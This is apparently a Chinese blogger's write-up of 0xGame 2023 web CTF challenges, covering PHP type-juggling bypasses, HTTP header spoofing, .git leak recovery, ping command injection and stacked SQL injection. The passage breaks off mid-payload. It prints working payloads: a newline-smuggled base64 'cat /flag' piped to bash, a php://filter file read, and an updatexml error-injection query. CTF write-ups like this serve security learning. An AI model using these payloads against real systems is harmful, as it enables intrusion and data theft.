500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF赛事</span></a></span></div></div><h1 class="post-title" itemprop="name headline">0xGame 2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-22T07:33:54.356Z" title="发表于 2023-10-22 15:33:54">2023-10-22</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-11-05T08:54:48.931Z" title="更新于 2023-11-05 16:54:48">2023-11-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>62分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="0xGame 2023"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/10/22/0xgame-2023/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/10/22/0xgame-2023/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/10/22/0xgame-2023/"><header><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url">CTF赛事</a><h1 id="CrawlerTitle" itemprop="name headline">0xGame 2023</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-10-22T07:33:54.356Z" title="发表于 2023-10-22 15:33:54">2023-10-22</time><time itemprop="dateCreated datePublished" datetime="2023-11-05T08:54:48.931Z" title="更新于 2023-11-05 16:54:48">2023-11-05</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！</p>
<p>不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！）</p>
<h2 id="week-1-signin">[Week 1] signin</h2>
<p>![image-20231022153622957](0xGame 2023/image-20231022153622957.png)</p>
<p>首先打开之后是一个简单的页面，这里页面还说你能找到flag吗？-呵呵，我tm当然找不到了。。。</p>
<p>这里呢我尝试抓包以及dirsearch扫目录均无果，当时就焦虑了，我想着tm第一周的新手题就不会了？？？之后一下想到F12打开抓个包看看是否有信息，嗨，想不到真有</p>
<p>![image-20231022154409249](0xGame 2023/image-20231022154409249.png)</p>
<p>F12开启控制台随后重新刷新一下页面抓包，这里发现有页面的js文件源码，这时我就认为大概率就是此处了哈哈</p>
<p>![image-20231022154505505](0xGame 2023/image-20231022154505505.png)</p>
<p>一番搜索发现flag果然在此js文件下。</p>
<h2 id="week-1-baby_php">[Week 1] baby_php</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// flag in flag.php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'name'</span>])) {
    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];
    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];
    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'name'</span>];

    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) {
            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">'.php'</span>);
        }
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>简单的PHP特性，这里首先要求传入的a、b参数不相等，但md5加密后的值要相等，我们直接数组绕过即可。</p>
<p>其次在接着判断c参数是否是数字，只有c满足不是数字，且c不等于1024，且c经过intval取整后等于1024即可包含flag.php文件</p>
<p>那首先是绕过is_numeric函数</p>
<pre><code class="hljs plaintext">is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后</code></pre>
<p>根据上述我们可以实现绕过，不过这里直接在后面+其他字符如a也可以。</p>
<p>其次是<code>$c != 1024 &amp;&amp; intval($c) == 1024</code>这里可以看到有取整函数，那我们应该想到将c赋值为浮点类型，这样就可以成功绕过，并且 intval 也会截断非数字的部分</p>
<p>最终payload如下：</p>
<pre><code class="hljs http">GET：?a[]=1&amp;b[]=2
POST：c=1024.1a
cookie：name=php://filter/convert.base64-encode/resource=flag</code></pre>
<p>至于为何这里要用php伪协议读取，我猜测是如果直接赋值为flag.php的话，inlcude会执行php文件中的代码，导致最终结果不可见，故此选择伪协议读取，将文件内容进行base64编码导致其不可执行最终回显出来</p>
<p>![image-20231022160313639](0xGame 2023/image-20231022160313639.png)</p>
<p>如上图直接base64解码即可</p>
<h2 id="week-1-hello_http">[Week 1] hello_http</h2>
<p>![image-20231022160421773](0xGame 2023/image-20231022160421773.png)</p>
<p>这里考察http基础知识，根据页面信息我们选择get传参query为ctf</p>
<p>![image-20231022160629635](0xGame 2023/image-20231022160629635.png)</p>
<p>接着让我们post传参action为getflag</p>
<p>![image-20231022160651994](0xGame 2023/image-20231022160651994.png)</p>
<p>又提示我们不是admin，这里还是直接上bp吧</p>
<p>![image-20231022160725124](0xGame 2023/image-20231022160725124.png)</p>
<p>发现敏感词role，我们将其修改为admin</p>
<p>![image-20231022160754322](0xGame 2023/image-20231022160754322.png)</p>
<p>此时又提示我们不是内网ip，那我们用xff头修改一下看看</p>
<p>![image-20231022160844324](0xGame 2023/image-20231022160844324.png)</p>
<p>这时提示我们ua头不是指定的，那我们直接修改即可</p>
<p>![image-20231022160917710](0xGame 2023/image-20231022160917710.png)</p>
<p>最后又提示我们referer头来源不正确，那我们继续修改</p>
<p>![image-20231022161019184](0xGame 2023/image-20231022161019184.png)</p>
<p>拿到flag</p>
<h2 id="week-1-repo_leak">[Week 1] repo_leak</h2>
<p>![image-20231022161204842](0xGame 2023/image-20231022161204842.png)</p>
<p>如上图，我们看一下题目名称就可以猜到应该是信息泄露，此时dirsearch扫一下看看</p>
<p>![image-20231022161318450](0xGame 2023/image-20231022161318450.png)</p>
<p>如图发现很多关于git泄露的东西，这里直接上工具去利用漏洞：</p>
<p>使用<code>githack等工具</code>下载站点存储库的整个代码历史记录和配置信息。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHub - lijiejie/GitHack: A <code>.git</code> folder disclosure exploit</a></p>
<p>下载地址如上，注意是python2环境，具体用法参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43511094/article/details/123634720?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123634720.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">Git泄露总结</a></p>
<p>用法如下：在工具所在目录打开cmd</p>
<pre><code class="hljs plaintext">python2 GitHack.py http://120.27.148.152:50013/.git/</code></pre>
<p>![image-20231022162258605](0xGame 2023/image-20231022162258605.png)</p>
<p>![image-20231022163523977](0xGame 2023/image-20231022163523977.png)</p>
<p>随后进入目标url所在目录</p>
<p>![image-20231022163541284](0xGame 2023/image-20231022163541284.png)</p>
<p>首先查看一下git日志，可以看到哪一个人在哪个时间提交了那一个文件，每一个commit都会生成一个哈希值，这个值是唯一的，相当于commit的身份证</p>
<p>这里可以看到在 第二次提交的时候看到其提交了flag，那我们查看一下</p>
<p>![image-20231022163710703](0xGame 2023/image-20231022163710703.png)</p>
<p>git reflog：可以查看近期所有的提交记录，这样就可以回滚到任意一个版本</p>
<p>接下来查看flag所在的8a5b670：git show 8a5b670</p>
<p>![image-20231022163941388](0xGame 2023/image-20231022163941388.png)</p>
<p>可以进一步查看提交的文件内容，找到flag</p>
<h2 id="week-1-ping">[Week 1] ping</h2>
<p>![image-20231022164257042](0xGame 2023/image-20231022164257042.png)</p>
<p>打开是一个ping命令执行页面，我们先查看一下源码看看有什么信息</p>
<p>![image-20231022164321959](0xGame 2023/image-20231022164321959.png)</p>
<p>果然这里提示我们访问一下api.php</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>{
    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">';'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$s</span>);
    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">' '</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$s</span>);
    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$s</span>);
    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'flag'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$s</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'source'</span>])) {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ip'</span>])) {
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'No IP Address'</span>);
}

<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ip'</span>];

<span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])/'</span>, <span class="hljs-variable">$ip</span>)) {
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid IP Address'</span>);
}

<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'ping -c 4 '</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">' 2&gt;&amp;1'</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>结果发现这里是前面ping页面的源码，这里可以看到过滤了分号，空格，斜杠以及flag关键词，不过这里对我们传入的ip执行了正则的过滤，这里过滤的很全，似乎是只允许数字的，这里我们尝试换行绕过</p>
<p>先搞一个对上述正则的解释：</p>
<pre><code class="hljs plaintext">整个正则表达式用于匹配IPv4地址的所有四个部分，确保每个部分的值在0到255之间，且用点号分隔。这是一个有效的IPv4地址验证正则表达式。</code></pre>
<p>payload：</p>
<pre><code class="hljs plaintext">ip=127.0.0.1%0als</code></pre>
<p>![image-20231022165222349](0xGame 2023/image-20231022165222349.png)</p>
<p>如上图看到成功执行，那现在就是考虑如果绕过过滤读取到flag了，这里肯定就要用到编码之类的</p>
<p>空格过滤的话我们可以用&lt;&gt;或者${IFS}等等，至于分号的过滤（大概率是避免我们的变量拼接吧）这里网站文章翻翻发现base64编码就可以绕过</p>
<pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"bHMgLw=="</span>|base64 -d|bash ==&gt;ls /
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Y2F0IC9mbGFn"</span>|base64 -d|bash ==&gt;cat /flag
    
注意上述的payload之前的空格符用${IFS}代替即可绕过</code></pre>
<p>![image-20231022165608398](0xGame 2023/image-20231022165608398.png)</p>
<p>![image-20231022165735258](0xGame 2023/image-20231022165735258.png)</p>
<p>拿到flag</p>
<h2 id="week-2-ez_sqli">[Week 2] ez_sqli</h2>
<p>![image-20231022170307981](0xGame 2023/image-20231022170307981.png)</p>
<p>随后在下载题目给的附件，是一串python源码</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request
<span class="hljs-keyword">import</span> MySQLdb
<span class="hljs-keyword">import</span> re

blacklist = [<span class="hljs-string">'select'</span>, <span class="hljs-string">'update'</span>, <span class="hljs-string">'insert'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'database'</span>, <span class="hljs-string">'table'</span>, <span class="hljs-string">'column'</span>, <span class="hljs-string">'alter'</span>, <span class="hljs-string">'create'</span>, <span class="hljs-string">'drop'</span>, <span class="hljs-string">'and'</span>, <span class="hljs-string">'or'</span>, <span class="hljs-string">'xor'</span>, <span class="hljs-string">'if'</span>, <span class="hljs-string">'else'</span>, <span class="hljs-string">'then'</span>, <span class="hljs-string">'where'</span>]

conn = MySQLdb.connect(host=<span class="hljs-string">'db'</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">'root'</span>, passwd=<span class="hljs-string">'root'</span>, db=<span class="hljs-string">'ctf'</span>)

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    field = request.args.get(<span class="hljs-string">'order'</span>, <span class="hljs-string">'id'</span>)
    field = re.sub(<span class="hljs-string">r'\s+'</span>, <span class="hljs-string">''</span>, field)

    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:
        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():
            <span class="hljs-keyword">return</span> s + <span class="hljs-string">' are banned'</span>

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r"id|name|email"</span>, field):
        field = <span class="hljs-string">'id'</span>

    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
        cursor.execute(<span class="hljs-string">'SELECT * FROM userinfo order by %s'</span> % field)
        res = cursor.fetchall()

    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, res=res)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)</code></pre>
<p>这里呢设置了黑名单过滤了很多敏感词，之后如果访问/路由的话，或自动执行index函数</p>
<p>随后检查get参数的order和id，遍历黑名单数组查看是否存在敏感字词。接着查看传入的field是否是id，name，email中的一个，如果不是则默认配置为id，之后执行 sql语句根据field内容查找回显内容</p>
<p>这里分析完之后我依旧没什么思路，太菜了，这里也是看了hint发现可以堆叠注入，他说是敏感函数<code>cursor.execute</code>可以 执行多条sql语句，事后诸葛亮的我悟了，看来日后分析代码时，也要搜寻相关函数的用法来找漏洞。</p>
<p>既然提示我们是堆叠注入，且其中黑名单过滤的很多以及sub去掉了空白字符（也就是过滤空格），因此这里我又没思路了，只能看wp了，发现其利用的是mysql预处理知识，但我还没仔细学过，因此这里我直接大概了解一下上个payload，之后认真学习一番（最近事情好多，真累啊~~）</p>
<p>wp讲的：</p>
<pre><code class="hljs plaintext">考察 MySQL 堆叠注⼊ + 预处理语句绕过 WAF

⿊名单过滤了常⻅的 SQL 关键词, 正常没办法进⾏ SQL 注⼊, sqlmap 也跑不出来

⾸先得知道 mysqlclient (MySQLdb) 的 cursor.execute() ⽀持执⾏多条 SQL 语句, 这个也给了 hint

然后, MySQL ⽀持 SQL 语句的预处理 (set prepare execute), 这个⽹上搜搜也能找到对应的⽂章和 payload</code></pre>
<p>预处理语句如下：</p>
<pre><code class="hljs mysql">prepare stmt from 'SELECT * FROM users WHERE id=?';
set @id=1;
execute stmt using @id;</code></pre>
<p>这里我们用报错注入去搞，但报错注入回显内容有限，</p>
<pre><code class="hljs sql"># step <span class="hljs-number">1</span>
<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);
# step <span class="hljs-number">2</span>
